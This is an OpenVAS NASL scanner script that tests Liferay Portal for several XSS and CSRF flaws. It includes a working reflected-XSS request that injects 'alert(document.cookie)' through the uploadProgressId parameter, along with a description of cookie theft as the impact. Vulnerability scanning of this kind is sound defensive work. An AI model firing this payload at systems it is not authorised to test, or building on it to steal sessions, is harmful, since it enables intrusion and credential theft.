##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_liferay_portal_mult_vuln.nasl 9352 2018-04-06 07:13:02Z cfischer $
#
# Liferay Portal Multiple Vulnerabilities
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow remote attackers to execute
arbitrary script code in the browser of an unsuspecting user in the context of
the affected site, steal cookie based authentication credentials, disclose or
modify sensitive information, perform unauthorized actions in the context
of a user's session.

Impact Level: Application";

tag_affected = "Liferay Portal version 6.1.10 and prior";

tag_insight = "Multiple flaws are due to
- Input passed to the 'uploadProgressId' parameter in html/portal/upload_
progress_poller.jsp is not properly sanitised before being returned to
the user.
- Input passed to the 'ckEditorConfigFileName' parameter when editing
articles in a journal is not properly sanitised before being returned to
the user.
- Input passed to the '_16_chartId' parameter when viewing the currency
converter is not properly sanitised before being returned to the user.
- Input passed to the 'tag' parameter when viewing blog categories is not
properly sanitised before being returned to the user.
- The application allows users to perform certain actions via HTTP requests
without performing any validity checks to verify the requests. This can be
exploited to disclose potentially sensitive information.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "This host is running Liferay Portal and is prone to multiple
vulnerabilities.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802630");
  script_version("$Revision: 9352 $");
  script_bugtraq_id(53546);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:13:02 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2012-05-21 12:12:12 +0530 (Mon, 21 May 2012)");
  script_name("Liferay Portal Multiple Vulnerabilities");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/49205");
  script_xref(name : "URL" , value : "http://seclists.org/bugtraq/2012/May/79");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/75654");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/522726");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/112737/liferay6-xss.txt");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 8080);
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
port = 0;

## Get HTTP Port
port = get_http_port(default:8080);
if(!port){
  exit(0);
}

url = "/c/portal/license";

## Confirm the application before trying exploit
if(http_vuln_check(port:port, url:url, check_header:TRUE,
   pattern:"Powered by <a [^>]+>Liferay</a>"))
{
  ## Construct attack request
  url = "/html/portal/upload_progress_poller.jsp?uploadProgressId=a=1;" +
        "alert(document.cookie);//";

  ## Try XSS and check the response to confirm vulnerability
  if(http_vuln_check(port:port, url:url, check_header: TRUE,
     pattern:"parent.a=1;alert\(document.cookie\);//")){
    security_message(port);
  }
}
